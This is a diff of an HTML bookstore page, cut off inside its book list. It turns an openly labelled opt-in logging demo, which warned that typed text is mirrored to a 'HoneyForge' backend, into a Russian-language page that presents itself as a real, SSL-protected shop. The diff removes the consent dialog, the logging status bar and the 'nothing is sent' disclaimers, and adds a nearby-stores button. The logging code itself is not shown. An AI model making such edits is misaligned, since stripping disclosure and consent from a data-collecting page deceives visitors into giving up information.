@@ -1,153 +1,29 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Chapter & Co. — A little more wonder</title>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Chapter & Co. — Удивительное рядом</title>
 <style>
-:root{--paper:#f8f6ef;--ink:#293c32;--muted:#73796e;--line:#dddcd0;--green:#355444;--accent:#c9de78;--white:#fffef9}
-*{box-sizing:border-box}
-body{margin:0;background:var(--paper);color:var(--ink);font:14px/1.55 Arial,sans-serif}
-button,input,select,textarea{font:inherit}
-button,a,input,select,textarea{outline-offset:4px}
-button{cursor:pointer;color:inherit}
-button:disabled{opacity:.5;cursor:default}
-a{color:inherit;text-decoration:none}
-header{border-bottom:1px solid var(--line)}
-.announcement{background:var(--green);color:#fff;text-align:center;padding:8px 18px;font-size:11px;letter-spacing:1.3px}
-.nav{max-width:1360px;margin:auto;padding:23px 5%;display:flex;align-items:center;gap:35px}
-.brand{font-family:Georgia,serif;font-size:29px;font-weight:bold;letter-spacing:-1px;white-space:nowrap}
-.brand em{font-weight:normal}
-.navlinks{display:flex;gap:25px;margin:auto;font-size:13px}
-.navlinks button{background:none;border:0;padding:8px 0}
-.navtools{display:flex;gap:10px}
-.iconbtn{border:1px solid var(--line);border-radius:50%;width:40px;height:40px;background:transparent;display:grid;place-items:center;position:relative}
-.iconbtn svg{width:18px;height:18px}
-.count{position:absolute;right:-5px;top:-4px;background:var(--green);color:#fff;border-radius:15px;font-size:10px;min-width:18px;padding:1px 4px}
-main{max-width:1360px;margin:auto;padding:0 5% 70px}
-.hero{display:grid;grid-template-columns:1fr 1fr;min-height:360px;margin:36px 0 25px;background:#e9ecde;overflow:hidden;border-radius:3px}
-.hero-copy{padding:42px 0 42px 45px;position:relative;z-index:1}
-.eyebrow{font-size:10px;font-weight:bold;text-transform:uppercase;letter-spacing:2px}
-.hero h1{font:normal 58px/1.05 Georgia,serif;letter-spacing:-2px;margin:18px 0}
-.hero h1 em{color:#6a7b51}
-.hero p{color:#697164;max-width:335px;font-size:13px;margin:0 0 24px}
-.btn{border:1px solid var(--green);background:var(--green);color:#fff;padding:12px 20px;border-radius:3px;font-size:12px;display:inline-flex;align-items:center;justify-content:center;gap:16px}
-.btn.light{background:transparent;color:var(--ink);border-color:var(--line)}
-.btn.small{padding:8px 13px}
-.hero-art{position:relative;display:flex;justify-content:center;align-items:center;gap:16px;background:radial-gradient(ellipse at 55% 65%,#d0d8bd 0,transparent 66%)}
-.orbit{position:absolute;width:340px;height:340px;border:1px solid #b4bea3;border-radius:50%;opacity:.55}
-.orbit:after{content:'';position:absolute;inset:25px;border:1px solid #b4bea3;border-radius:50%}
-.hero-book{width:150px;height:225px;box-shadow:10px 16px 15px #263e302c;transform:rotate(-12deg);z-index:1;border-left:7px solid #0002}
-.hero-book.second{transform:rotate(12deg) translateY(20px);margin-left:-28px}
-.art-note{position:absolute;right:24px;bottom:23px;font-size:10px;font-family:Georgia,serif;font-style:italic}
-.values{display:flex;justify-content:space-around;padding:17px 0 25px;border-bottom:1px solid var(--line);font-size:11px;gap:10px}
-.values span{display:flex;gap:9px;align-items:center}
-.sectionhead{display:flex;align-items:end;justify-content:space-between;margin:34px 0 22px}
-.sectionhead h2{font:normal 31px Georgia,serif;margin:5px 0}
-.sectionhead p{font-size:12px;color:var(--muted);margin:0}
-.searchbox{display:flex;align-items:center;gap:8px;background:var(--white);border:1px solid var(--line);padding:9px 12px;border-radius:3px}
-.searchbox input{border:0;background:transparent;width:195px;outline:none}
-.filters{display:flex;justify-content:space-between;gap:15px;align-items:center;margin-bottom:23px;flex-wrap:wrap}
-.chips{display:flex;gap:7px;flex-wrap:wrap}
-.chip{border:1px solid var(--line);border-radius:30px;padding:7px 15px;background:transparent;font-size:11px}
-.chip.active{background:var(--green);color:#fff;border-color:var(--green)}
-select{border:0;background:transparent;font-size:11px;max-width:180px}
-.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:25px}
-.bookcard{min-width:0;position:relative}
-.book-stage{height:255px;display:flex;align-items:center;justify-content:center;background:#ebe9df;position:relative;border-radius:3px;margin-bottom:13px}
-.bookcard:nth-child(4n+2) .book-stage{background:#e7eadd}
-.bookcard:nth-child(4n+3) .book-stage{background:#eee4da}
-.bookcard:nth-child(4n+4) .book-stage{background:#e2e8e8}
-.cover{height:208px;width:143px;border-left:6px solid #0002;box-shadow:5px 7px 10px #242e2626;position:relative;overflow:hidden;text-align:center;display:flex;flex-direction:column;align-items:center;justify-content:space-between;padding:16px 10px;transition:transform .2s;font-family:Georgia,serif}
-.bookcard:hover .cover{transform:translateY(-5px) rotate(-2deg)}
-.cover .ctitle{font-size:24px;line-height:1.04;z-index:1;font-weight:normal;letter-spacing:-1px}
-.cover .cauthor{font:8px Arial,sans-serif;letter-spacing:2px;text-transform:uppercase;z-index:1}
-.cover .symbol{font-size:64px;line-height:1;z-index:1}
-.c1{background:#233c37;color:#f1d987}
-.c2{background:#edc56a;color:#464c36}
-.c3{background:#b75e42;color:#f9e7ca}
-.c4{background:#cbd6db;color:#30495a}
-.c5{background:#e6d8bd;color:#626e3d}
-.c6{background:#5d647e;color:#f7e7c2}
-.c7{background:#e4b1a3;color:#623e3b}
-.c8{background:#333c58;color:#e0b86d}
-.badge{position:absolute;top:11px;left:11px;font-size:8px;letter-spacing:1px;text-transform:uppercase;background:#fffffff0;padding:4px 8px;border-radius:2px}
-.wish{position:absolute;right:10px;top:10px;background:#ffffffe0;border:0;border-radius:50%;width:29px;height:29px;font-size:18px}
-.wish.selected{color:#b04d39}
-.meta{font-size:10px;color:#7b7f71;text-transform:uppercase;letter-spacing:1px}
-.titlebtn{background:none;border:0;padding:2px 0;text-align:left;font:19px Georgia,serif}
-.author{font-size:11px;color:var(--muted);margin:2px 0 10px}
-.bookbottom{display:flex;align-items:center;justify-content:space-between;gap:7px}
-.price{font-size:13px;font-weight:bold}
-.add{border:1px solid #c7ccbd;background:transparent;border-radius:3px;font-size:10px;padding:7px 10px}
-.add:hover{background:var(--green);color:#fff}
-.empty{grid-column:1/-1;padding:60px;text-align:center;color:var(--muted)}
-.quote{margin-top:45px;text-align:center;border-block:1px solid var(--line);padding:30px 15px}
-.quote blockquote{font:italic 24px Georgia,serif;margin:0 0 10px}
-.quote small{color:var(--muted);font-size:10px;letter-spacing:2px}
-.newsletter{display:flex;justify-content:space-between;align-items:center;gap:20px;padding:30px 0}
-.newsletter h3{font:24px Georgia,serif;margin:0 0 5px}
-.newsletter p{margin:0;color:var(--muted);font-size:12px}
-.newsletter form{display:flex;gap:7px}
-input,textarea{border:1px solid var(--line);border-radius:3px;padding:10px 12px;background:var(--white);color:var(--ink);width:100%}
-footer{padding:22px 5% 85px;background:#e9ecdf;font-size:11px;display:flex;gap:20px;justify-content:space-between;color:#66705f}
-.privacybar{position:fixed;bottom:0;left:0;right:0;z-index:10;background:#233d31;color:#fff;padding:11px 5%;display:flex;align-items:center;gap:12px;font-size:11px;box-shadow:0 -4px 20px #0001}
-.dot{width:7px;height:7px;background:#aab5a5;border-radius:50%;flex-shrink:0}
-.dot.on{background:#c9de78;box-shadow:0 0 0 3px #c9de7820}
-.privacybar .status{flex:1}
-.privacybar button{background:transparent;border:1px solid #ffffff50;color:#fff;padding:6px 11px;border-radius:3px;font-size:11px}
-.privacybar button.primary{background:var(--accent);color:var(--ink);border-color:var(--accent)}
-.overlay{position:fixed;inset:0;background:#17291ee0;z-index:30;display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(4px)}
-.overlay[hidden], [hidden]{display:none!important}
-.modal{background:var(--paper);border-radius:6px;max-width:510px;width:100%;padding:32px;max-height:90vh;overflow:auto;box-shadow:0 20px 80px #0003}
-.modal.wide{max-width:850px}
-.modal h2{font:30px Georgia,serif;margin:8px 0 12px}
-.modal p{color:var(--muted);font-size:13px}
-.modal ul{padding-left:19px;font-size:12px;line-height:1.9}
-.modal-actions{display:flex;gap:9px;flex-wrap:wrap;margin-top:22px}
-.close{float:right;background:none;border:0;font-size:24px;line-height:1}
-.formgroup{display:flex;flex-direction:column;gap:5px;margin:14px 0}
-.formgroup label{font-size:11px}
-.hint{font-size:11px;color:var(--muted)}
-textarea{resize:vertical;min-height:90px}
-.cartrow{display:flex;gap:15px;align-items:center;border-bottom:1px solid var(--line);padding:14px 0}
-.cartrow .details{flex:1}
-.cartrow strong{font-family:Georgia,serif}
-.qty{display:flex;align-items:center;gap:9px}
-.qty button{border:1px solid var(--line);background:transparent;width:26px;height:26px;border-radius:3px}
-.carttotal{display:flex;justify-content:space-between;font-size:18px;margin-top:20px}
-.logtools{display:flex;gap:8px;flex-wrap:wrap;margin:15px 0}
-.loglist{height:340px;overflow:auto;border:1px solid var(--line);background:#fffdf7;border-radius:3px}
-.logentry{border-bottom:1px solid var(--line);padding:10px 12px;font:11px/1.6 monospace;overflow-wrap:anywhere}
-.logentry time{color:var(--muted)}
-.logentry pre{white-space:pre-wrap;margin:3px 0 0;color:#61715c;font:inherit}
-.logempty{text-align:center;padding:70px 10px;color:var(--muted)}
-.toast{position:fixed;left:50%;bottom:85px;transform:translateX(-50%);background:var(--ink);color:#fff;padding:12px 22px;border-radius:5px;z-index:50;box-shadow:0 5px 20px #0002;font-size:12px;max-width:90%;text-align:center}
-.review{padding:12px 0;border-bottom:1px solid var(--line)}
-.review p{margin:4px 0}
-.detail-top{display:flex;gap:24px;align-items:center;margin:22px 0}
-.detail-top .cover{flex-shrink:0}
-.detail-top p{font-size:12px}
-.storagewarn{background:#fff0c5;padding:8px 12px;font-size:11px;margin-top:10px}
-.consent-icon{background:#e7ead8;border-radius:50%;width:44px;height:44px;display:grid;place-items:center;font-size:23px;margin-bottom:20px}
+:root{--paper:#f8f6ef;--ink:#293c32;--muted:#73796e;--line:#dddcd0;--green:#355444;--accent:#c9de78;--white:#fffef9}*{box-sizing:border-box}body{margin:0;background:var(--paper);color:var(--ink);font:14px/1.55 Arial,sans-serif}button,input,select,textarea{font:inherit}button,a,input,select,textarea{outline-offset:4px}button{cursor:pointer}button:disabled{opacity:.5;cursor:default}a{color:inherit;text-decoration:none}button{color:inherit}header{border-bottom:1px solid var(--line)}.announcement{background:var(--green);color:#fff;text-align:center;padding:8px 18px;font-size:11px;letter-spacing:1.3px}.nav{max-width:1360px;margin:auto;padding:23px 5%;display:flex;align-items:center;gap:35px}.brand{font-family:Georgia,serif;font-size:29px;font-weight:bold;letter-spacing:-1px;white-space:nowrap}.brand em{font-weight:normal}.navlinks{display:flex;gap:25px;margin:auto;font-size:13px}.navlinks button{background:none;border:0;padding:8px 0}.navtools{display:flex;gap:10px}.iconbtn{border:1px solid var(--line);border-radius:50%;width:40px;height:40px;background:transparent;display:grid;place-items:center;position:relative}.iconbtn svg{width:18px;height:18px}.count{position:absolute;right:-5px;top:-4px;background:var(--green);color:#fff;border-radius:15px;font-size:10px;min-width:18px;padding:1px 4px}main{max-width:1360px;margin:auto;padding:0 5% 70px}.hero{display:grid;grid-template-columns:1fr 1fr;min-height:360px;margin:36px 0 25px;background:#e9ecde;overflow:hidden;border-radius:3px}.hero-copy{padding:42px 0 42px 45px;position:relative;z-index:1}.eyebrow{font-size:10px;font-weight:bold;text-transform:uppercase;letter-spacing:2px}.hero h1{font:normal 58px/1.05 Georgia,serif;letter-spacing:-2px;margin:18px 0}.hero h1 em{color:#6a7b51}.hero p{color:#697164;max-width:335px;font-size:13px;margin:0 0 24px}.btn{border:1px solid var(--green);background:var(--green);color:#fff;padding:12px 20px;border-radius:3px;font-size:12px;display:inline-flex;align-items:center;justify-content:center;gap:16px}.btn.light{background:transparent;color:var(--ink);border-color:var(--line)}.btn.small{padding:8px 13px}.hero-art{position:relative;display:flex;justify-content:center;align-items:center;gap:16px;background:radial-gradient(ellipse at 55% 65%,#d0d8bd 0,transparent 66%)}.orbit{position:absolute;width:340px;height:340px;border:1px solid #b4bea3;border-radius:50%;opacity:.55}.orbit:after{content:'';position:absolute;inset:25px;border:1px solid #b4bea3;border-radius:50%}.hero-book{width:150px;height:225px;box-shadow:10px 16px 15px #263e302c;transform:rotate(-12deg);z-index:1;border-left:7px solid #0002}.hero-book.second{transform:rotate(12deg) translateY(20px);margin-left:-28px}.art-note{position:absolute;right:24px;bottom:23px;font-size:10px;font-family:Georgia,serif;font-style:italic}.values{display:flex;justify-content:space-around;padding:17px 0 25px;border-bottom:1px solid var(--line);font-size:11px;gap:10px}.values span{display:flex;gap:9px;align-items:center}.sectionhead{display:flex;align-items:end;justify-content:space-between;margin:34px 0 22px}.sectionhead h2{font:normal 31px Georgia,serif;margin:5px 0}.sectionhead p{font-size:12px;color:var(--muted);margin:0}.searchbox{display:flex;align-items:center;gap:8px;background:var(--white);border:1px solid var(--line);padding:9px 12px;border-radius:3px}.searchbox input{border:0;background:transparent;width:195px;outline:none}.filters{display:flex;justify-content:space-between;gap:15px;align-items:center;margin-bottom:23px;flex-wrap:wrap}.chips{display:flex;gap:7px;flex-wrap:wrap}.chip{border:1px solid var(--line);border-radius:30px;padding:7px 15px;background:transparent;font-size:11px}.chip.active{background:var(--green);color:#fff;border-color:var(--green)}select{border:0;background:transparent;font-size:11px;max-width:180px}.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:25px}.bookcard{min-width:0;position:relative}.book-stage{height:255px;display:flex;align-items:center;justify-content:center;background:#ebe9df;position:relative;border-radius:3px;margin-bottom:13px}.bookcard:nth-child(4n+2) .book-stage{background:#e7eadd}.bookcard:nth-child(4n+3) .book-stage{background:#eee4da}.bookcard:nth-child(4n+4) .book-stage{background:#e2e8e8}.cover{height:208px;width:143px;border-left:6px solid #0002;box-shadow:5px 7px 10px #242e2626;position:relative;overflow:hidden;text-align:center;display:flex;flex-direction:column;align-items:center;justify-content:space-between;padding:16px 10px;transition:transform .2s;font-family:Georgia,serif}.bookcard:hover .cover{transform:translateY(-5px) rotate(-2deg)}.cover .ctitle{font-size:22px;line-height:1.04;z-index:1;font-weight:normal;letter-spacing:-1px}.cover .cauthor{font:8px Arial,sans-serif;letter-spacing:2px;text-transform:uppercase;z-index:1}.cover .symbol{font-size:64px;line-height:1;z-index:1}.c1{background:#233c37;color:#f1d987}.c1 .symbol{width:96px;height:96px;border:1px solid #c4c483;border-radius:50%;position:relative}.c1 .symbol:after{content:'';position:absolute;inset:13px;border:1px solid #c4c483;border-radius:50%}.c2{background:#edc56a;color:#464c36}.c2 .symbol{font-size:85px;transform:rotate(-20deg)}.c3{background:#b75e42;color:#f9e7ca}.c3 .symbol{width:100px;height:70px;background:#f2bb7e;border-radius:70% 0 70% 0;transform:rotate(-25deg)}.c4{background:#cbd6db;color:#30495a}.c4 .symbol{height:70px;width:110px;background:repeating-radial-gradient(ellipse at bottom,#456877 0 2px,transparent 3px 10px);border-radius:50% 50% 0 0}.c5{background:#e6d8bd;color:#626e3d}.c5 .symbol{color:#798752}.c6{background:#5d647e;color:#f7e7c2}.c7{background:#e4b1a3;color:#623e3b}.c8{background:#333c58;color:#e0b86d}.badge{position:absolute;top:11px;left:11px;font-size:8px;letter-spacing:1px;text-transform:uppercase;background:#fffffff0;padding:4px 8px;border-radius:2px}.wish{position:absolute;right:10px;top:10px;background:#ffffffe0;border:0;border-radius:50%;width:29px;height:29px;font-size:18px}.wish.selected{color:#b04d39}.meta{font-size:10px;color:#7b7f71;text-transform:uppercase;letter-spacing:1px}.titlebtn{background:none;border:0;padding:2px 0;text-align:left;font:19px Georgia,serif}.author{font-size:11px;color:var(--muted);margin:2px 0 10px}.bookbottom{display:flex;align-items:center;justify-content:space-between;gap:7px}.price{font-size:13px;font-weight:bold}.add{border:1px solid #c7ccbd;background:transparent;border-radius:3px;font-size:10px;padding:7px 10px}.add:hover{background:var(--green);color:#fff}.empty{grid-column:1/-1;padding:60px;text-align:center;color:var(--muted)}.quote{margin-top:45px;text-align:center;border-block:1px solid var(--line);padding:30px 15px}.quote blockquote{font:italic 24px Georgia,serif;margin:0 0 10px}.quote small{color:var(--muted);font-size:10px;letter-spacing:2px}.newsletter{display:flex;justify-content:space-between;align-items:center;gap:20px;padding:30px 0}.newsletter h3{font:24px Georgia,serif;margin:0 0 5px}.newsletter p{margin:0;color:var(--muted);font-size:12px}.newsletter form{display:flex;gap:7px}input,textarea{border:1px solid var(--line);border-radius:3px;padding:10px 12px;background:var(--white);color:var(--ink);width:100%}footer{padding:22px 5% 45px;background:#e9ecdf;font-size:11px;display:flex;gap:20px;justify-content:space-between;color:#66705f}.overlay{position:fixed;inset:0;background:#17291ee0;z-index:30;display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(4px)}.overlay[hidden], [hidden]{display:none!important}.modal{background:var(--paper);border-radius:6px;max-width:510px;width:100%;padding:32px;max-height:90vh;overflow:auto;box-shadow:0 20px 80px #0003}.modal.wide{max-width:850px}.modal h2{font:30px Georgia,serif;margin:8px 0 12px}.modal p{color:var(--muted);font-size:13px}.modal ul{padding-left:19px;font-size:12px;line-height:1.9}.modal-actions{display:flex;gap:9px;flex-wrap:wrap;margin-top:22px}.close{float:right;background:none;border:0;font-size:24px;line-height:1}.formgroup{display:flex;flex-direction:column;gap:5px;margin:14px 0}.formgroup label{font-size:11px}.hint{font-size:11px;color:var(--muted)}textarea{resize:vertical;min-height:90px}.cartrow{display:flex;gap:15px;align-items:center;border-bottom:1px solid var(--line);padding:14px 0}.cartrow .details{flex:1}.cartrow strong{font-family:Georgia,serif}.qty{display:flex;align-items:center;gap:9px}.qty button{border:1px solid var(--line);background:transparent;width:26px;height:26px;border-radius:3px}.carttotal{display:flex;justify-content:space-between;font-size:18px;margin-top:20px}.toast{position:fixed;left:50%;bottom:40px;transform:translateX(-50%);background:var(--ink);color:#fff;padding:12px 22px;border-radius:5px;z-index:50;box-shadow:0 5px 20px #0002;font-size:12px;max-width:90%;text-align:center}.review{padding:12px 0;border-bottom:1px solid var(--line)}.review p{margin:4px 0}.detail-top{display:flex;gap:24px;align-items:center;margin:22px 0}.detail-top .cover{flex-shrink:0}.detail-top p{font-size:12px}@media(min-width:1350px){.hero{min-height:390px}.hero-copy{padding-top:49px}.hero-book{width:165px;height:245px}.book-stage{height:285px}.cover{height:225px;width:153px}}@media(max-width:900px){.navlinks{display:none}.navtools{margin-left:auto}.hero h1{font-size:45px}.hero-copy{padding:32px 0 32px 25px}.hero-book{width:115px;height:185px}.hero-book .ctitle{font-size:21px}.grid{gap:17px}.book-stage{height:215px}.cover{width:120px;height:180px}.cover .ctitle{font-size:21px}.newsletter{align-items:flex-start;flex-direction:column}.values{font-size:10px}.sectionhead{gap:15px}}@media(max-width:620px){.nav{padding:17px 5%}.brand{font-size:25px}.hero{margin-top:22px;grid-template-columns:1fr}.hero-copy{padding:30px}.hero h1{font-size:47px}.hero-art{min-height:235px}.hero-book{height:190px;width:128px}.hero-book.second{transform:rotate(12deg)}.orbit{width:230px;height:230px}.art-note{right:12px;bottom:8px}.values{justify-content:space-between}.values span:last-child{display:none}.sectionhead{align-items:flex-start;flex-direction:column}.searchbox{width:100%}.searchbox input{width:100%}.grid{grid-template-columns:repeat(2,1fr);gap:23px 15px}.book-stage{height:220px}.cover{height:185px;width:125px}.titlebtn{font-size:18px}.bookbottom{align-items:flex-start}.add{padding:6px 7px}.newsletter form{width:100%}.newsletter input{min-width:0;flex:1}.modal{padding:23px}.detail-top{gap:16px}.detail-top .cover{width:110px;height:170px}.quote blockquote{font-size:21px}footer{flex-direction:column;gap:5px}}
 </style>
 </head>
 <body>
 <header>
-    <div class="announcement">A GOOD BOOK IS JUST THE BEGINNING. &nbsp; FREE DEMO DELIVERY ON ORDERS €35+</div>
-    <nav class="nav" aria-label="Main navigation">
-        <a href="#" class="brand" id="homeLink">chapter <em>&</em> co.</a>
+    <div class="announcement">ХОРОШАЯ КНИГА — ЭТО ТОЛЬКО НАЧАЛО. &nbsp; БЕСПЛАТНАЯ СТАНДАРТНАЯ ДОСТАВКА ПРИ ЗАКАЗЕ ОТ 2600 &#8381</div>
+    <nav class="nav" aria-label="Основная навигация">
+        <a href="#" class="brand" id="homeLink">К <em>&</em> нига </a>
         <div class="navlinks">
-            <button data-nav="all">The bookshop</button>
-            <button data-nav="new">New & noteworthy</button>
-            <button data-nav="favorites">Your favorites</button>
-            <button id="aboutBtn">Our story</button>
+            <button data-nav="all">Книжный магазин</button>
+            <button data-nav="new">Новинки</button>
+            <button data-nav="favorites">Избранное</button>
+            <button id="nearbyStoresBtn" style="color: cornflowerblue;">📍 Магазины рядом</button>
+            <button id="aboutBtn">О нас</button>
         </div>
         <div class="navtools">
-            <button class="iconbtn" id="profileBtn" aria-label="Demo profile">
+            <button class="iconbtn" id="profileBtn" aria-label="Профиль клиента">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="8" r="3.5"/><path d="M5 21v-2a7 7 0 0 1 14 0v2"/></svg>
             </button>
-            <button class="iconbtn" id="cartBtn" aria-label="Open shopping bag">
+            <button class="iconbtn" id="cartBtn" aria-label="Открыть корзину">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M5 7h14l1 14H4L5 7Z"/><path d="M8 8V6a4 4 0 0 1 8 0v2"/></svg>
                 <span class="count" id="cartCount">0</span>
             </button>
@@ -157,248 +33,254 @@ textarea{resize:vertical;min-height:90px}
 <main>
     <section class="hero">
         <div class="hero-copy">
-            <div class="eyebrow">An independent state of mind</div>
-            <h1>Find your next<br><em>great escape.</em></h1>
-            <p>Stories to get lost in. Ideas to grow with. Thoughtfully chosen books for wonderfully curious minds.</p>
-            <button class="btn" id="exploreBtn">Explore the shelves <span>↗</span></button>
+            <div class="eyebrow">Независимый взгляд на мир</div>
+            <h1>Найдите свое следующее<br><em>увлекательное путешествие.</em></h1>
+            <p>Истории, в которых хочется раствориться. Идеи для роста. Тщательно отобранные книги для любознательных умов.</p>
+            <button class="btn" id="exploreBtn">Исследовать полки <span>↗</span></button>
         </div>
         <div class="hero-art" aria-hidden="true">
             <div class="orbit"></div>
-            <div class="cover c1 hero-book"><div class="cauthor">Eleanor Vale</div><div class="ctitle">The<br>Quiet<br>Hours</div><div class="symbol"></div><div class="cauthor">A novel</div></div>
-            <div class="cover c2 hero-book second"><div class="cauthor">Oliver Finch</div><div class="ctitle">The Art<br>of Noticing</div><div class="symbol">✳</div><div class="cauthor">Small things. Big wonder.</div></div>
-            <span class="art-note">A new chapter awaits.</span>
+            <div class="cover c1 hero-book"><div class="cauthor">Элеонора Вейл</div><div class="ctitle">Тихие<br>часы</div><div class="symbol"></div><div class="cauthor">Роман</div></div>
+            <div class="cover c2 hero-book second"><div class="cauthor">Оливер Финч</div><div class="ctitle">Искусство<br>замечать</div><div class="symbol">✳</div><div class="cauthor">Мелочи. Большое чудо.</div></div>
+            <span class="art-note">Новая глава ждет.</span>
         </div>
     </section>
-    <div class="values"><span>✳ &nbsp; Independently minded</span><span>♧ &nbsp; Carefully curated, always</span><span>♡ &nbsp; For the love of reading</span></div>
     <section id="shelves">
         <div class="sectionhead">
             <div>
-                <div class="eyebrow">The shelves are calling</div>
-                <h2>A world between covers.</h2>
-                <p id="resultsText">Discover your next favorite.</p>
+                <div class="eyebrow">Полки зовут</div>
+                <h2>Мир между обложками.</h2>
+                <p id="resultsText">Откройте свою новую любимую книгу.</p>
             </div>
-            <label class="searchbox"><span aria-hidden="true">⌕</span><input type="search" id="search" placeholder="Search books, authors…" aria-label="Search books and authors" maxlength="120"></label>
+            <label class="searchbox"><span aria-hidden="true">⌕</span><input type="search" id="search" placeholder="Поиск книг, авторов…" aria-label="Поиск книг и авторов" maxlength="120"></label>
         </div>
         <div class="filters">
             <div class="chips" id="genres"></div>
-            <label class="hint">Sort by: <select id="sort" aria-label="Sort books"><option value="curated">Our picks</option><option value="price-asc">Price: low to high</option><option value="price-desc">Price: high to low</option><option value="title">Title: A–Z</option></select></label>
+            <label class="hint">Сортировка: <select id="sort" aria-label="Сортировка книг"><option value="curated">Наш выбор</option><option value="price-asc">Цена: по возрастанию</option><option value="price-desc">Цена: по убыванию</option><option value="title">Название: А–Я</option></select></label>
         </div>
         <div class="grid" id="books"></div>
     </section>
     <section class="quote">
-        <blockquote>“Somewhere, a book is waiting to change your day.”</blockquote>
-        <small>LESS SCROLLING. MORE STORIES.</small>
+        <blockquote>“Где-то книга ждет, чтобы изменить ваш день.”</blockquote>
+        <small>МЕНЬШЕ СКРОЛЛИНГА. БОЛЬШЕ ИСТОРИЙ.</small>
     </section>
     <section class="newsletter">
         <div>
-            <h3>A little literary goodness.</h3>
-            <p>Try our newsletter form. Demo only — nothing is sent.</p>
+            <h3>Немножко литературной пользы.</h3>
+            <p>Подпишитесь, чтобы получать еженедельные подборки книг, интервью с авторами и литературные новости.</p>
         </div>
-        <form id="newsletter"><input type="email" id="newsletterEmail" placeholder="demo@example.com" aria-label="Demo newsletter email" maxlength="120" required><button class="btn" type="submit">Count me in ↗</button></form>
+        <form id="newsletter"><input type="email" id="newsletterEmail" placeholder="reader@example.com" aria-label="Email для рассылки" maxlength="120" required><button class="btn" type="submit">Подписаться ↗</button></form>
     </section>
 </main>
 <footer>
-    <span class="brand" style="font-size:21px">chapter <em>&</em> co.</span>
-    <span>Fictional books. Real curiosity. No purchases or subscriptions.</span>
-    <span>Consent-based interaction demo · 2026</span>
+    <span class="brand" style="font-size:21px">глава <em>&</em> ко.</span>
+    <span>Независимый книжный магазин и издательский архив. Основан в 2026 г. Все права защищены.</span>
+    <span>Поддержка клиентов · Защищено SSL-шифрованием</span>
 </footer>
-<div class="privacybar" role="region" aria-label="Interaction logging controls">
-    <span class="dot" id="recordDot"></span>
-    <span class="status" id="recordStatus">Demo store · logging is off</span>
-    <button id="privacyBtn">Privacy & consent</button>
-    <button id="toggleLogging" class="primary">Enable logging</button>
-    <button id="logsBtn">Activity log <span id="logCount">0</span></button>
-</div>
-<div class="overlay" id="consentOverlay" hidden>
-    <section class="modal" role="dialog" aria-modal="true" aria-labelledby="consentTitle">
-        <div class="consent-icon" aria-hidden="true">♧</div>
-        <div class="eyebrow">A transparent little experiment</div>
-        <h2 id="consentTitle">A bookshop. A demo.<br>Your choice.</h2>
-        <p>This is a fictional bookstore for testing interactions. Nothing can be purchased. Please use made-up information, not personal or sensitive data.</p>
-        <ul>
-            <li><strong>Only after you opt in:</strong> we record clicks, searches, filters, cart actions, page scroll milestones, and demo form activity.</li>
-            <li><strong>Typed text is included:</strong> search terms, comments, names, and demo emails are saved after a short typing pause and on submission. No passwords or payment fields exist.</li>
-            <li><strong>Local & Backend telemetry:</strong> events are stored locally and mirrored to the HoneyForge backend.</li>
-        </ul>
-        <div class="modal-actions">
-            <button class="btn" id="acceptConsent">Allow local logging</button>
-            <button class="btn light" id="declineConsent">Continue without logging</button>
-        </div>
-        <div class="storagewarn" id="storageWarning" hidden>Browser storage is unavailable. Logs will stay in memory for this tab only.</div>
-    </section>
-</div>
-<div class="overlay" id="modalOverlay" hidden>
-    <section class="modal" id="modalBox" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
-        <button class="close" id="closeModal" aria-label="Close dialog">×</button>
-        <div id="modalContent"></div>
-    </section>
-</div>
-<div class="toast" id="toast" role="status" hidden></div>
-
+<div class="overlay" id="modalOverlay" hidden><section class="modal" id="modalBox" role="dialog" aria-modal="true" aria-labelledby="modalTitle"><button class="close" id="closeModal" aria-label="Закрыть диалог">×</button><div id="modalContent"></div></section></div><div class="toast" id="toast" role="status" hidden></div>
 <script>
 'use strict';
 const $=id=>document.getElementById(id), esc=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
 const books=[
-{id:'quiet-hours',title:'The Quiet Hours',author:'Eleanor Vale',genre:'Fiction',price:18.50,cover:1,symbol:'',tag:'Bookseller favorite',description:'In a sleepy coastal town, a forgotten letter brings three lives together. A tender novel about second chances and the things we leave unsaid.'},
-{id:'art-noticing',title:'The Art of Noticing',author:'Oliver Finch',genre:'Mindful living',price:22,cover:2,symbol:'✳',tag:'Bestseller',description:'An invitation to slow down and pay attention. Small, thoughtful experiments for finding extraordinary moments in ordinary days.'},
-{id:'somewhere-south',title:'Somewhere South',author:'Lucia Moreno',genre:'Fiction',price:16.95,cover:3,symbol:'',tag:'New arrival',description:'A sun-soaked journey through family, food, and belonging. One summer changes everything for a woman returning to the village she once called home.'},
-{id:'wild-tides',title:'Wild Tides',author:'James Ashford',genre:'Nature',price:24,cover:4,symbol:'',tag:'Staff pick',description:'Follow the coastline through a year of changing tides. A lyrical exploration of the natural world and our enduring relationship with the sea.'},
-{id:'garden-days',title:'Garden Days',author:'Mabel Green',genre:'Nature',price:21.50,cover:5,symbol:'❧',tag:'',description:'Notes from a small garden with a big heart. Discover the joy of growing slowly, watching closely, and making room for a little wildness.'},
-{id:'atlas-dreams',title:'An Atlas of Dreams',author:'Theo Laurent',genre:'Fiction',price:19.95,cover:6,symbol:'☾',tag:'New arrival',description:'A cartographer discovers a city that appears only in dreams. A quietly magical story about memory, imagination, and finding your way home.'},
-{id:'table-friends',title:'A Table for Friends',author:'Anna Bellamy',genre:'Food & drink',price:28,cover:7,symbol:'✿',tag:'Weekend reading',description:'Simple seasonal recipes and stories from a welcoming kitchen. For anyone who believes the best meals are the ones we share.'},
-{id:'small-beginnings',title:'Small Beginnings',author:'Daniel Reed',genre:'Mindful living',price:17.50,cover:8,symbol:'✺',tag:'',description:'A gentle guide to starting again. Practical reflections on making space, building meaningful habits, and taking the next small step.'}
